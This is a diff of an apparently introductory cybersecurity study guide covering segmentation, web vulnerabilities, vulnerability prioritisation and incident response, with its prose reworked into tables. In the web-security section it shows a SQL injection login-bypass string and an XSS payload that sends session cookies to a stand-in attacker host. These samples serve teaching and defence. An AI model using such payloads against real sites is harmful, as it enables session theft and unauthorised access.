+A **VPN** (Phase 2) creates an encrypted tunnel. In corporate use it also places the remote device *inside* the network, as though it were on-site. That is its security purpose and its risk in one sentence: a compromised laptop on the VPN is an internal machine, with internal reach.
 
-**Segmentation** is the practice of dividing a network into zones so that compromise of one does not mean compromise of all. The classic example is separating the corporate network from the server network from the industrial control network, with firewall rules controlling the paths between. The security value is **containment** — it limits **lateral movement**, the phase where an attacker who has one foothold moves through the network looking for more.
+**Segmentation** is the practice of dividing a network into zones so that compromise of one does not mean compromise of all. The classic example is separating the corporate network from the server network from the industrial control network, with firewall rules controlling the paths between.
 
-Two related ideas worth knowing. **Microsegmentation** applies the same principle at the level of individual workloads rather than network zones, which is common in cloud environments. And **the flat network** — everything on one segment with no internal controls — is the anti-pattern all of this exists to avoid. In a flat network, one phished laptop can reach every server. Segmentation is what makes the difference between "we had an incident" and "we had a breach."
+The security value is **containment**. It limits **lateral movement**, the phase where an attacker who has one foothold moves through the network looking for more.
+
+#### Microsegmentation and the flat network
+
+Two related ideas worth knowing.
+
+| Idea | What it is |
+|---|---|
+| **Microsegmentation** | The same principle applied at the level of individual workloads rather than network zones. Common in cloud environments |
+| **The flat network** | Everything on one segment with no internal controls. The anti-pattern all of this exists to avoid |
+
+In a flat network, one phished laptop can reach every server. Segmentation is what makes the difference between “we had an incident” and “we had a breach.”
 
 A good interview answer connects this to the CIA triad and to least privilege: segmentation is least privilege applied to *network reachability* rather than to accounts. The same principle, a different dimension.
 
-#### Secure protocols, and DNS filtering
+#### Secure protocols: the insecure/secure pairing
 
-The **secure ports and protocols** question is really the question "is this traffic encrypted and authenticated?" The pattern to learn is the pairing of an insecure protocol with its secure replacement:
+The **secure ports and protocols** question is really the question “is this traffic encrypted and authenticated?” The pattern to learn is the pairing of an insecure protocol with its secure replacement.
 
 | Insecure | Secure | Notes |
 |---|---|---|
@@ -270,11 +527,23 @@ The **secure ports and protocols** question is really the question "is this traf
 | LDAP (389) | LDAPS (636) | Directory queries carry credentials |
 | SNMPv1/v2 (161) | SNMPv3 | v3 adds authentication and encryption |
 
-The reason this table is worth knowing rather than looking up is that spotting telnet or FTP in a scan is an immediate finding, and doing so *instantly* is what makes a scan review efficient. Phase 2 taught you to read a port list; this is what you read it *for*.
+The reason this table is worth knowing rather than looking up is that spotting telnet or FTP in a scan is an immediate finding. Doing so *instantly* is what makes a scan review efficient. Phase 2 taught you to read a port list; this is what you read it *for*.
 
-**DNS filtering** is the practice of blocking resolution of known-malicious domains. Its appeal is that it sits early in the attack chain: malware must typically resolve a command-and-control domain before it can do anything, so blocking the lookup breaks the attack before any file is delivered. It also covers every device on the network without an agent.
+#### DNS filtering: early in the chain, easy to bypass
 
-Its limitation is equally important and is why it is a *layer* rather than a solution: it only works on names, so **direct-to-IP connections bypass it entirely**, as do **DNS-over-HTTPS** clients and **domain generation algorithms**, where malware generates hundreds of candidate domains so that blocking a list catches only some. DNS filtering stops unsophisticated attacks cheaply and is trivially bypassed by sophisticated ones. Both halves of that sentence belong in your answer.
+**DNS filtering** is the practice of blocking resolution of known-malicious domains.
+
+Its appeal is that it sits early in the attack chain. Malware must typically resolve a command-and-control domain before it can do anything, so blocking the lookup breaks the attack before any file is delivered. It also covers every device on the network without an agent.
+
+Its limitation is equally important, and is why it is a *layer* rather than a solution.
+
+| Bypass | Why filtering misses it |
+|---|---|
+| Direct-to-IP connections | DNS filtering only works on names |
+| DNS-over-HTTPS clients | The lookup is encrypted and leaves the network's resolver entirely |
+| Domain generation algorithms | Malware generates hundreds of candidate domains, so blocking a list catches only some |
+
+DNS filtering stops unsophisticated attacks cheaply and is trivially bypassed by sophisticated ones. Both halves of that sentence belong in your answer.
 
 ### Part 4 — Web security: the domain where you start ahead
 
@@ -282,133 +551,297 @@ Its limitation is equally important and is why it is a *layer* rather than a sol
 
 The OWASP Top 10 was introduced in Phase 1 as a shared vocabulary. This part is where you learn to actually find and reason about the categories, and where your web development history becomes an asset.
 
-The organising insight for this whole part, and the sentence to remember: **almost every web vulnerability is a failure to keep data and code separate, or a failure to check that the person asking is allowed to ask.** Injection attacks are the first failure. Broken access control, IDOR, and session weaknesses are the second. That is genuinely most of it.
+#### The one sentence that organises this whole part
 
-#### Injection: the concept behind SQL injection and XSS
+The organising insight, and the sentence to remember: **almost every web vulnerability is a failure to keep data and code separate, or a failure to check that the person asking is allowed to ask.**
 
-The phase lists SQL injection and XSS separately, but they are the *same bug* in different interpreters, and understanding that is more valuable than learning them as two facts.
+| Failure | Which categories it covers |
+|---|---|
+| Data escaped into code | Injection attacks — SQL injection and XSS |
+| Not checking whether the asker is allowed | Broken access control, IDOR, and session weaknesses |
 
-**Injection** happens when untrusted input is interpreted as instructions rather than as data. The vulnerability exists wherever a program builds a command by concatenating strings, and the specific name depends on what is being concatenated into.
+That is genuinely most of it.
 
-**SQL injection** occurs when user input becomes part of a database query. Consider:
+#### Injection: one bug in different interpreters
+
+The phase lists SQL injection and XSS separately, but they are the *same bug* in different interpreters. Understanding that is more valuable than learning them as two facts.
+
+**Injection** happens when untrusted input is interpreted as instructions rather than as data. The vulnerability exists wherever a program builds a command by concatenating strings. The specific name depends on what is being concatenated into.
+
+| Name | The interpreter | Where the input lands |
+|---|---|---|
+| SQL injection | A database | A query |
+| Cross-site scripting (XSS) | A browser | HTML that becomes script |
+| Command injection | The operating system shell | A shell command |
+
+#### Worked example: SQL injection in one query
+
+**SQL injection** occurs when user input becomes part of a database query. Consider this legitimate query:
 
 ```sql
 SELECT * FROM users WHERE username = 'alice' AND password = 'secret123';
 ```
 
-If the application builds this by concatenation and the user enters `' OR '1'='1` as the password, the query becomes:
+The application builds it by concatenation. The user enters `' OR '1'='1` as the password, and the query becomes:
 
 ```sql
 SELECT * FROM users WHERE username = 'alice' AND password = '' OR '1'='1';
 ```
 
-Since `'1'='1'` is always true, the `WHERE` clause matches every row and the login succeeds with no valid password. Notice what actually went wrong: the database did exactly what it was told. The application handed it a string in which the *data* had escaped into the *code*, and the database cannot tell the difference.
+Since `'1'='1'` is always true, the `WHERE` clause matches every row and the login succeeds with no valid password.
 
-The fix is **parameterised queries** (prepared statements), where the query structure is sent separately from the values, so the database knows `' OR '1'='1` is a password string and never an instruction. This is the point worth internalising: **SQL injection is not fixed by filtering input, it is fixed by never letting input become code.** Escaping and blocklists are band-aids that miss encodings; parameterisation removes the vulnerability class.
+Notice what actually went wrong: **the database did exactly what it was told.** The application handed it a string in which the *data* had escaped into the *code*, and the database cannot tell the difference.
 
-**Cross-site scripting (XSS)** is the same failure with the browser as the interpreter: untrusted input is rendered into HTML, so it becomes script that runs in *another user's* browser. The classic reflected form is a search page that echoes the query — submit `<script>fetch('https://evil.example/?c='+document.cookie)</script>` and if the page renders it as HTML rather than text, every visitor's session cookie is sent to the attacker. **Stored XSS** is worse: the payload is saved (in a comment, a profile, a support ticket) and fires for everyone who views it, with no interaction needed.
+#### The fix: parameterised queries
 
-The fix is **output encoding** — rendering untrusted data as text, not markup — supported by **Content Security Policy**, which restricts where scripts may load from. And note the connection to Part 1: stealing the session cookie is a *session token theft*, which defeats MFA entirely because authentication already happened. This is why the `HttpOnly` cookie flag exists: it makes cookies unreadable from JavaScript, which does not fix XSS but removes one of its worst payoffs.
+The fix is **parameterised queries** (prepared statements), where the query structure is sent separately from the values. The database then knows `' OR '1'='1` is a password string and never an instruction.
+
+This is the point worth internalising: **SQL injection is not fixed by filtering input, it is fixed by never letting input become code.**
+
+| Approach | What it does | Verdict |
+|---|---|---|
+| Escaping and blocklists | Tries to neutralise dangerous characters | Band-aids that miss encodings |
+| Parameterised queries | Separates structure from values | Removes the vulnerability class |
+
+#### XSS: the same bug, browser as interpreter
+
+**Cross-site scripting (XSS)** is the same failure with the browser as the interpreter: untrusted input is rendered into HTML, so it becomes script that runs in *another user's* browser.
+
+Two forms, and the second is worse.
+
+| Form | How it works | Who it hits |
+|---|---|---|
+| **Reflected** | A search page echoes the query. Submit `<script>fetch('https://evil.example/?c='+document.cookie)</script>` and if the page renders it as HTML rather than text, every visitor's session cookie is sent to the attacker | Whoever follows the crafted link |
+| **Stored** | The payload is saved — in a comment, a profile, a support ticket — and fires for everyone who views it | Everyone, with no interaction needed |
+
+The fix is **output encoding** — rendering untrusted data as text, not markup — supported by **Content Security Policy**, which restricts where scripts may load from.
+
+#### The link back to Part 1
+
+Note the connection to Part 1: stealing the session cookie is a *session token theft*, which defeats MFA entirely because authentication already happened.
+
+This is why the `HttpOnly` cookie flag exists. It makes cookies unreadable from JavaScript, which does not fix XSS but removes one of its worst payoffs.
 
 #### Broken access control and IDOR
 
-**IDOR** — Insecure Direct Object Reference — is the vulnerability where an application exposes a reference to an internal object and trusts the client to use it correctly. It is the clearest example of an authorisation failure (Part 1) and it is dead simple to understand:
+**IDOR** — Insecure Direct Object Reference — is the vulnerability where an application exposes a reference to an internal object and trusts the client to use it correctly. It is the clearest example of an authorisation failure (Part 1), and it is dead simple to understand.
 
 ```text
 GET /api/invoices/1001     → your invoice
 GET /api/invoices/1002     → someone else's invoice
 ```
 
-If the second request returns data, the application checked *authentication* (are you logged in?) but not *authorisation* (is this invoice yours?). The fix is a server-side check on every request that the authenticated user is permitted to access the specific object. The security reason this bug is so common is a wrong assumption that runs through many codebases: developers assume that because the UI only ever shows users their own links, nobody will type a different number. The UI is not a control. **Anything the client sends is attacker-controlled.**
+If the second request returns data, the application checked *authentication* (are you logged in?) but not *authorisation* (is this invoice yours?).
 
-**Broken access control** is the wider category — the OWASP Top 10's number one entry in recent editions — covering IDOR, privilege escalation (a normal user reaching admin functions by calling the admin endpoint directly), and forced browsing (reaching a page by URL when the link is hidden). All of them share the same root cause and the same fix: enforce permissions on the server, for every request, based on identity rather than on what the interface offers.
+The fix is a server-side check on every request that the authenticated user is permitted to access the specific object.
+
+#### The wrong assumption that makes IDOR common
+
+The security reason this bug is so common is an assumption that runs through many codebases: developers assume that because the UI only ever shows users their own links, nobody will type a different number.
+
+**The UI is not a control. Anything the client sends is attacker-controlled.**
+
+#### Broken access control: the wider category
+
+**Broken access control** is the wider category — the OWASP Top 10's number one entry in recent editions. It covers IDOR plus two related bugs.
+
+| Bug | What it looks like |
+|---|---|
+| IDOR | Changing an object identifier to reach someone else's data |
+| Privilege escalation | A normal user reaching admin functions by calling the admin endpoint directly |
+| Forced browsing | Reaching a page by URL when the link is hidden |
+
+All of them share the same root cause and the same fix: enforce permissions on the server, for every request, based on identity rather than on what the interface offers.
 
 #### Session and authentication weaknesses
 
-Sessions are how a web application remembers you across requests, and they are a high-value target because *a stolen session is a completed authentication.*
+Sessions are how a web application remembers you across requests. They are a high-value target because *a stolen session is a completed authentication.*
 
-- **Session fixation** — the attacker sets a known session ID before the victim logs in; if the application does not issue a fresh ID at login, the attacker now holds a valid session.
-- **Predictable session IDs** — sequential or weakly random identifiers that can be guessed.
-- **No expiry or no logout invalidation** — sessions that live forever, or that remain valid server-side after logout. A token that still works after "log out" is a real-world finding.
-- **Missing cookie flags** — `Secure` (HTTPS only) and `HttpOnly` (unreadable from JavaScript, as above). `SameSite` addresses cross-site request forgery, where another site causes the victim's browser to make an authenticated request.
-- **Credentials in URLs** — tokens in query strings end up in browser history, proxy logs, and `Referer` headers.
+| Weakness | How it works |
+|---|---|
+| **Session fixation** | The attacker sets a known session ID before the victim logs in. If the application does not issue a fresh ID at login, the attacker now holds a valid session |
+| **Predictable session IDs** | Sequential or weakly random identifiers that can be guessed |
+| **No expiry or no logout invalidation** | Sessions that live forever, or that remain valid server-side after logout. A token that still works after “log out” is a real-world finding |
+| **Missing cookie flags** | `Secure` (HTTPS only) and `HttpOnly` (unreadable from JavaScript, as above). `SameSite` addresses cross-site request forgery, where another site causes the victim's browser to make an authenticated request |
+| **Credentials in URLs** | Tokens in query strings end up in browser history, proxy logs, and `Referer` headers |
 
-**Security headers** are the defence-in-depth layer, and the phase asks only for basics. The four worth knowing: `Content-Security-Policy` (restricts script sources, the strongest XSS mitigation), `Strict-Transport-Security` (forces HTTPS for future visits), `X-Content-Type-Options: nosniff` (stops content-type sniffing), and `X-Frame-Options` or the CSP `frame-ancestors` directive (prevents clickjacking, where your site is embedded invisibly in another). You can check any site's headers with `curl -I`, which is a small, satisfying thing to do on a site you own.
+#### Security headers: the defence-in-depth layer
+
+**Security headers** are the defence-in-depth layer, and the phase asks only for basics. Four are worth knowing.
+
+| Header | What it does |
+|---|---|
+| `Content-Security-Policy` | Restricts script sources. The strongest XSS mitigation |
+| `Strict-Transport-Security` | Forces HTTPS for future visits |
+| `X-Content-Type-Options: nosniff` | Stops content-type sniffing |
+| `X-Frame-Options` or the CSP `frame-ancestors` directive | Prevents clickjacking, where your site is embedded invisibly in another |
+
+You can check any site's headers with `curl -I`, which is a small, satisfying thing to do on a site you own.
 
 #### How to actually practise this
 
 The phase's task 4 is **five PortSwigger Apprentice labs**, and this is the single highest-value task in the phase for you. PortSwigger's Web Security Academy is free, needs no setup, and runs in a browser. Each lab is a real application with a real vulnerability and a defined objective.
 
-Do them properly: for each lab, write down what the vulnerability was, how you found it, what the payload or request looked like, and why the fix would work. Five labs understood at that level are worth more than fifty completed by following a walkthrough. And because your background is web development, add one thing most learners cannot: **write the vulnerable code, then write the fixed version.** Seeing your own parameterised query block the injection you just performed is the lesson that sticks.
+Do them properly. For each lab, write down four things.
 
-**OWASP ZAP** and **Burp Suite Community** (task 5) are the tools that make this practical — both are intercepting proxies that sit between your browser and the target so you can read and modify every request. Burp Community is the industry-standard tool for manual web testing; ZAP is the free open-source equivalent. Running a **passive scan** against your own application is safe and instructive: it reports what it observes without attacking anything.
+| What to record | Why |
+|---|---|
+| What the vulnerability was | Names the class, which is what an interviewer listens for |
+| How you found it | The method is the transferable skill |
+| What the payload or request looked like | The concrete evidence |
+| Why the fix would work | Proves you understand the cause, not just the symptom |
+
+Five labs understood at that level are worth more than fifty completed by following a walkthrough.
+
+And because your background is web development, add one thing most learners cannot: **write the vulnerable code, then write the fixed version.** Seeing your own parameterised query block the injection you just performed is the lesson that sticks.
+
+#### The tools that make this practical
+
+**OWASP ZAP** and **Burp Suite Community** (task 5) are intercepting proxies. They sit between your browser and the target so you can read and modify every request.
+
+| Tool | Character |
+|---|---|
+| Burp Suite Community | The industry-standard tool for manual web testing |
+| OWASP ZAP | The free open-source equivalent |
+
+Running a **passive scan** against your own application is safe and instructive: it reports what it observes without attacking anything.
 
 ### Part 5 — Vulnerability management: deciding what to fix first
 
-#### CVE, CVSS, and EPSS
+#### CVE, CVSS, and EPSS: three acronyms, three questions
 
 The phase lists three acronyms here, and they answer three different questions.
 
-**CVE** (Common Vulnerabilities and Exposures) is the identifier — `CVE-2021-44228`. It answers *which vulnerability is this?* It is a naming system, nothing more, and its value is that everyone worldwide means the same thing by the same number.
+| Acronym | Full name | The question it answers | Example |
+|---|---|---|---|
+| **CVE** | Common Vulnerabilities and Exposures | *Which vulnerability is this?* | `CVE-2021-44228` |
+| **CVSS** | Common Vulnerability Scoring System | *How bad is it technically?* | 0.0 to 10.0 |
+| **EPSS** | Exploit Prediction Scoring System | *How likely is this to actually be exploited in the next 30 days?* | A probability between 0 and 1, derived from real-world activity |
 
-**CVSS** (Common Vulnerability Scoring System) is the severity score, 0.0 to 10.0, answering *how bad is it technically?* Scores map to qualitative bands: 9.0–10.0 critical, 7.0–8.9 high, 4.0–6.9 medium, 0.1–3.9 low. CVSS is computed from characteristics like whether the attack is remote, whether authentication is needed, and what the impact on confidentiality, integrity, and availability is — note that this is the CIA triad from Phase 1 appearing inside the scoring formula. The `CVE-2021-44228` example above (Log4Shell) scored 10.0.
+**CVE** is a naming system, nothing more. Its value is that everyone worldwide means the same thing by the same number.
 
-**EPSS** (Exploit Prediction Scoring System) answers a completely different question: *how likely is this vulnerability to actually be exploited in the next 30 days?* It is a probability between 0 and 1, derived from real-world activity.
+#### CVSS bands, and what goes into the score
 
-The reason all three matter together is the phase's next topic — prioritisation — and the reason prioritisation is hard is a fact worth stating plainly: **CVSS alone is a poor prioritisation tool.** There are far more "critical" CVEs than any team can fix, and most of them are never exploited. A CVSS 9.8 vulnerability in software you do not run is irrelevant. A CVSS 6.5 vulnerability that is being actively exploited in the wild, on an internet-facing server, holding customer data, is an emergency.
+**CVSS** is the severity score, 0.0 to 10.0, and scores map to qualitative bands.
 
-So the professional triage combines signal:
+| Score | Band |
+|---:|---|
+| 9.0–10.0 | Critical |
+| 7.0–8.9 | High |
+| 4.0–6.9 | Medium |
+| 0.1–3.9 | Low |
 
-- **CISA's Known Exploited Vulnerabilities (KEV) catalog** — a list of CVEs confirmed as exploited in the wild. This is why the phase's task 6 draws from KEV specifically: these are not theoretical. If a KEV entry affects your asset inventory, that is a top priority by definition.
-- **EPSS** — likelihood of exploitation, for ranking within the rest.
-- **Exposure** — is the system internet-facing or internal? Reachable is urgent.
-- **Asset criticality** — what breaks, and who is affected, if it falls?
-- **Existing controls** — is the vulnerable component even reachable, or is it behind a firewall and authentication?
+CVSS is computed from characteristics like whether the attack is remote, whether authentication is needed, and what the impact on confidentiality, integrity, and availability is. Note that this is the CIA triad from Phase 1 appearing inside the scoring formula. The `CVE-2021-44228` example above (Log4Shell) scored 10.0.
+
+#### Why CVSS alone is a poor prioritisation tool
+
+The reason all three matter together is the phase's next topic — prioritisation. The reason prioritisation is hard is a fact worth stating plainly: **CVSS alone is a poor prioritisation tool.**
+
+There are far more “critical” CVEs than any team can fix, and most of them are never exploited.
+
+| Example | CVSS | Actual priority |
+|---|---:|---|
+| A CVSS 9.8 vulnerability in software you do not run | 9.8 | Irrelevant |
+| A CVSS 6.5 vulnerability actively exploited in the wild, on an internet-facing server, holding customer data | 6.5 | An emergency |
+
+#### The five signals professional triage combines
+
+So the professional triage combines signal.
+
+| Signal | What it tells you |
+|---|---|
+| **CISA's Known Exploited Vulnerabilities (KEV) catalog** | A list of CVEs confirmed as exploited in the wild. This is why the phase's task 6 draws from KEV specifically: these are not theoretical. If a KEV entry affects your asset inventory, that is a top priority by definition |
+| **EPSS** | Likelihood of exploitation, for ranking within the rest |
+| **Exposure** | Is the system internet-facing or internal? Reachable is urgent |
+| **Asset criticality** | What breaks, and who is affected, if it falls? |
+| **Existing controls** | Is the vulnerable component even reachable, or is it behind a firewall and authentication? |
 
 That is **risk-based** prioritisation, and it is the same `likelihood × impact` reasoning from Phase 1 applied to a specific list of technical findings. Doing that arithmetic and being able to defend it is a core skill in both SOC and GRC work.
 
 #### Asset inventory: the prerequisite nobody wants to do
 
-**Asset inventory** — knowing what you own — is unglamorous and it is the foundation of everything else in this part. You cannot patch what you cannot list. You cannot assess exposure for a system you do not know exists. You cannot know whether a CVE affects you without knowing your software versions.
+**Asset inventory** — knowing what you own — is unglamorous, and it is the foundation of everything else in this part.
 
-The practical failure mode in real organisations is that the inventory is incomplete and outdated: a spreadsheet maintained by hand, shadow IT that nobody registered, cloud instances spun up and forgotten. Every one of those is invisible to the patching process. This is why CIS Controls puts inventory as Control 1 — first, before anything else — and why the phase's task asks you to map five controls to your home lab. Start where you are: for your home lab, list every machine, its OS, its services, and its purpose. That is a real asset inventory, and doing it once teaches the discipline.
+Without it, three things become impossible.
+
+| You cannot… | Because… |
+|---|---|
+| Patch | You cannot patch what you cannot list |
+| Assess exposure | You cannot assess exposure for a system you do not know exists |
+| Judge a CVE | You cannot know whether a CVE affects you without knowing your software versions |
+
+The practical failure mode in real organisations is that the inventory is incomplete and outdated: a spreadsheet maintained by hand, shadow IT that nobody registered, cloud instances spun up and forgotten. Every one of those is invisible to the patching process.
+
+This is why CIS Controls puts inventory as Control 1 — first, before anything else — and why the phase's task asks you to map five controls to your home lab. Start where you are: for your home lab, list every machine, its OS, its services, and its purpose. That is a real asset inventory, and doing it once teaches the discipline.
 
 #### Remediation versus mitigation
 
-These two words are used interchangeably in conversation and mean different things in a report, and getting them right is a small professional detail:
+These two words are used interchangeably in conversation and mean different things in a report. Getting them right is a small professional detail.
 
-- **Remediation** fixes the root cause. Patching the vulnerability, upgrading the component, correcting the misconfiguration. The problem is gone.
-- **Mitigation** reduces the risk without fixing the cause. Isolating the system from the network, adding a firewall rule, disabling a vulnerable feature, or adding a compensating control. The problem remains.
+| Term | What it does | Examples | Is the problem gone? |
+|---|---|---|---|
+| **Remediation** | Fixes the root cause | Patching the vulnerability, upgrading the component, correcting the misconfiguration | Yes |
+| **Mitigation** | Reduces the risk without fixing the cause | Isolating the system from the network, adding a firewall rule, disabling a vulnerable feature, adding a compensating control | No |
 
-Mitigation is legitimate and often necessary — you mitigate when a patch does not exist yet, or when the system cannot be taken down for patching. But mitigation is a **holding action**, and the professional discipline is to record it as such with a review date, rather than letting a temporary workaround quietly become permanent. The most common real-world finding is a mitigation from three years ago that everyone forgot was temporary.
+Mitigation is legitimate and often necessary. You mitigate when a patch does not exist yet, or when the system cannot be taken down for patching.
 
-**Patch verification** is the step that separates an assertion from evidence. "We deployed the patch" is a claim; "the patch is installed on 98 of 100 hosts, and here are the two exceptions with owner and date" is a fact. Verifying means re-checking the version or re-scanning after remediation, and tracking exceptions explicitly. When you write your five CVE summaries for the deliverable, include the verification step for each — it is the part most beginners omit and the part an interviewer notices.
+But mitigation is a **holding action**, and the professional discipline is to record it as such with a review date, rather than letting a temporary workaround quietly become permanent. The most common real-world finding is a mitigation from three years ago that everyone forgot was temporary.
+
+#### Patch verification: evidence versus assertion
+
+**Patch verification** is the step that separates an assertion from evidence.
+
+| Statement | What it is |
+|---|---|
+| “We deployed the patch” | A claim |
+| “The patch is installed on 98 of 100 hosts, and here are the two exceptions with owner and date” | A fact |
+
+Verifying means re-checking the version or re-scanning after remediation, and tracking exceptions explicitly. When you write your five CVE summaries for the deliverable, include the verification step for each — it is the part most beginners omit and the part an interviewer notices.
 
 ### Part 6 — Incident response: putting it together
 
 #### The six phases, and why the order is the lesson
 
-Incident response follows a standard lifecycle, and the phases are worth knowing by name because they are used as a shared vocabulary in every serious organisation:
+Incident response follows a standard lifecycle. The phases are worth knowing by name, because they are used as a shared vocabulary in every serious organisation.
 
-1. **Preparation** — before anything happens: plans, playbooks, tooling, contact lists, logging that is actually enabled, and rehearsals. Everything else is easier or impossible depending on this phase.
-2. **Identification** — is this actually an incident? Alerts fire constantly and most are benign; this phase is triage, confirming scope, and deciding whether to escalate.
-3. **Containment** — stop the spread. Isolate the host, disable the account, block the address. The goal is to prevent further damage *while preserving the ability to investigate*.
-4. **Eradication** — remove the attacker's presence. Delete the malware, remove **all** persistence mechanisms, close the exploited vulnerability.
-5. **Recovery** — restore normal operation safely. Restore from verified-clean backups, monitor for the attacker returning, and confirm the fix holds.
-6. **Lessons learned** — what happened, why, and what changes. This is the phase that improves the *next* response, and the one most often skipped under time pressure.
+| Phase | What happens |
+|---|---|
+| 1. **Preparation** | Before anything happens: plans, playbooks, tooling, contact lists, logging that is actually enabled, and rehearsals. Everything else is easier or impossible depending on this phase |
+| 2. **Identification** | Is this actually an incident? Alerts fire constantly and most are benign; this phase is triage, confirming scope, and deciding whether to escalate |
+| 3. **Containment** | Stop the spread. Isolate the host, disable the account, block the address. The goal is to prevent further damage *while preserving the ability to investigate* |
+| 4. **Eradication** | Remove the attacker's presence. Delete the malware, remove **all** persistence mechanisms, close the exploited vulnerability |
+| 5. **Recovery** | Restore normal operation safely. Restore from verified-clean backups, monitor for the attacker returning, and confirm the fix holds |
+| 6. **Lessons learned** | What happened, why, and what changes. This is the phase that improves the *next* response, and the one most often skipped under time pressure |
 
-Two observations that show understanding rather than recitation. First, **the phases are not always strictly sequential in practice** — containment may begin while identification is still incomplete, because stopping active ransomware matters more than finishing the analysis. Second, **the order encodes a real tension**: containment and investigation pull against each other. Pulling the plug on a machine stops the attacker and destroys volatile evidence (memory contents, network connections, running processes). This is why the professional instinct is to *isolate network access* rather than power off, preserving the host state while cutting the attack path.
+#### Two observations that show understanding
 
-#### Evidence handling, and the order of volatility
+**First, the phases are not always strictly sequential in practice.** Containment may begin while identification is still incomplete, because stopping active ransomware matters more than finishing the analysis.
 
-**Evidence handling** exists to keep findings credible. If your investigation concludes "the attacker exfiltrated 4 GB," that conclusion must rest on evidence that has not been altered. The core principles:
+**Second, the order encodes a real tension.** Containment and investigation pull against each other.
 
-- **Preserve the original.** Work on copies. Take a forensic image before touching anything, and keep the original untouched.
-- **Document the chain of custody** — who handled the evidence, when, and what they did. This matters legally and it matters for the credibility of your report.
-- **Record your actions as you take them**, including timestamps in a consistent timezone. Note UTC deliberately, because logs from different systems will be in different zones and correlating them is where error creeps in.
-- **Note hashes** of any evidence collected, so alteration is detectable.
+| Action | Stops the attacker? | Preserves evidence? |
+|---|---|---|
+| Pull the plug / power off | Yes | **No** — destroys volatile evidence: memory contents, network connections, running processes |
+| Isolate network access | Yes | **Yes** — preserves host state while cutting the attack path |
 
-**The order of volatility** is the principle that tells you what to collect first, because evidence disappears over time:
+This is why the professional instinct is to *isolate network access* rather than power off.
+
+#### Evidence handling, and why it matters
+
+**Evidence handling** exists to keep findings credible. If your investigation concludes “the attacker exfiltrated 4 GB,” that conclusion must rest on evidence that has not been altered.
+
+The core principles:
+
+| Principle | What it means in practice |
+|---|---|
+| **Preserve the original** | Work on copies. Take a forensic image before touching anything, and keep the original untouched |
+| **Document the chain of custody** | Who handled the evidence, when, and what they did. This matters legally and for the credibility of your report |
+| **Record your actions as you take them** | Including timestamps in a consistent timezone. Note UTC deliberately, because logs from different systems will be in different zones and correlating them is where error creeps in |
+| **Note hashes** | Of any evidence collected, so alteration is detectable |
+
+#### The order of volatility
+
+**The order of volatility** is the principle that tells you what to collect first, because evidence disappears over time.
 
 ```text
 Most volatile  → CPU registers, cache
@@ -419,11 +852,15 @@ Most volatile  → CPU registers, cache
 Least volatile → Physical configuration
 ```
 
-Collect the most volatile first, because it disappears soonest. Memory holds what is running *right now* — and in an era of fileless malware that lives only in memory, this is often the only place the evidence exists at all. This is why "just reboot it" is the single worst instinct in incident response: it destroys the most valuable evidence and may trigger the malware's own cleanup.
+Collect the most volatile first, because it disappears soonest.
+
+Memory holds what is running *right now* — and in an era of fileless malware that lives only in memory, this is often the only place the evidence exists at all. This is why “just reboot it” is the single worst instinct in incident response: it destroys the most valuable evidence and may trigger the malware's own cleanup.
 
 #### Building the incident timeline
 
-The phase's task 7 asks for a **mock incident timeline for a phishing login**, and this is the exercise that ties the entire phase together. A timeline is simply a chronological reconstruction of events, drawn from the logs described across all six parts, and building one is how you prove to yourself that you understand where evidence lives.
+The phase's task 7 asks for a **mock incident timeline for a phishing login**, and this is the exercise that ties the entire phase together.
+
+A timeline is simply a chronological reconstruction of events, drawn from the logs described across all six parts. Building one is how you prove to yourself that you understand where evidence lives.
 
 Worked example, which you should build your own version of:
 
@@ -438,24 +875,61 @@ Worked example, which you should build your own version of:
 | 03:11:30 | Outbound connection to `198.51.100.42:443`, 850 MB transferred | Firewall / proxy log | Possible **exfiltration** |
 | 09:05:00 | Helpdesk ticket: user reports odd login alert | Ticketing system | **Identification** — nine hours late |
 
-Read that table and notice how much it demonstrates: the ATT&CK mapping from Phase 1, the event IDs from Part 1, the endpoint telemetry from Part 2, the network evidence from Part 3, and the response phases from Part 6 — all applied to one scenario. It also shows the uncomfortable truth that incidents are usually identified hours or days after they begin, which is the argument for the detection improvements that come out of the lessons-learned phase.
+#### What that table demonstrates
 
-When you write yours, use the phase's deliverable structure: identify the initial access, the authentication evidence, the persistence, and the exfiltration, and name which control would have broken the chain at each step. That last column — the controls — is where you demonstrate the exit criterion.
+Read it again and notice how much it covers.
+
+| Element in the timeline | Where it came from in this phase |
+|---|---|
+| ATT&CK T1566 mapping | Phase 1 |
+| Event IDs 4624 and 4688, logon types 3 and 10 | Part 1 |
+| Process telemetry and a parent-child relationship | Part 2 |
+| Outbound connection and volume | Part 3 |
+| Scheduled task as persistence | Part 2 |
+| Identification nine hours late | Part 6 |
+
+It also shows the uncomfortable truth that incidents are usually identified hours or days after they begin, which is the argument for the detection improvements that come out of the lessons-learned phase.
+
+#### Writing your own timeline
+
+When you write yours, use the phase's deliverable structure. Identify the initial access, the authentication evidence, the persistence, and the exfiltration, and name which control would have broken the chain at each step.
+
+That last column — the controls — is where you demonstrate the exit criterion.
 
 #### Reporting
 
-The final piece is the written report, and it is worth being direct about its importance: **a finding nobody can act on is not a finding.** Technical skill that cannot be communicated does not translate into organisational value, which is why Phase 1 said that attackers do not write reports and professionals do.
+The final piece is the written report, and it is worth being direct about its importance: **a finding nobody can act on is not a finding.**
 
-A usable incident report structure:
+Technical skill that cannot be communicated does not translate into organisational value, which is why Phase 1 said that attackers do not write reports and professionals do.
 
-- **Summary** — what happened, in plain language, for someone who will read only this paragraph.
-- **Timeline** — the evidence table above.
-- **Impact** — what was affected, what data, how many systems, what is the business consequence.
-- **Root cause** — the actual weakness, not just the mechanism. "A user clicked a link" is not a root cause; "credential phishing succeeded because MFA was not enforced on this account" is.
-- **Actions taken** — containment, eradication, recovery, with times.
-- **Recommendations** — specific, prioritised, and owned by someone. Not "improve security" but "enforce MFA on all accounts by [date], owner [team], addressing the gap that allowed this."
+#### A usable incident report structure
 
-The distinction between a mechanism and a root cause in that list is worth re-reading, because it is the difference between a report that gets a control fixed and one that gets filed. And the GRC connection is direct: recommendations become risk register entries, and the controls that address them map to CIS or NIST — which is the phase's final deliverable, the five-risk control-mapping table.
+| Section | What goes in it |
+|---|---|
+| **Summary** | What happened, in plain language, for someone who will read only this paragraph |
+| **Timeline** | The evidence table above |
+| **Impact** | What was affected, what data, how many systems, what is the business consequence |
+| **Root cause** | The actual weakness, not just the mechanism |
+| **Actions taken** | Containment, eradication, recovery, with times |
+| **Recommendations** | Specific, prioritised, and owned by someone |
+
+#### Mechanism versus root cause
+
